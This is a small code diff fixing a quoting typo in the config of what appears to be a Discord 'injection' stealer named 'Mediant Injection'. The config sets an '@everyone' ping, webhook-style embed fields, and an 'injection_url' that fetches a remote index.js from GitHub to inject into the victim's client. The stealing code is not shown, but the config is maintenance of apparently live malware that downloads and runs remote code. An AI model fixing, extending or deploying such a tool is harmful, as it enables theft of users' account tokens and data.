@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Mediant Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/img/xd.jpg), 
+  embed_icon: 'https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/img/xd.jpg', 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/index.js', 
   /**
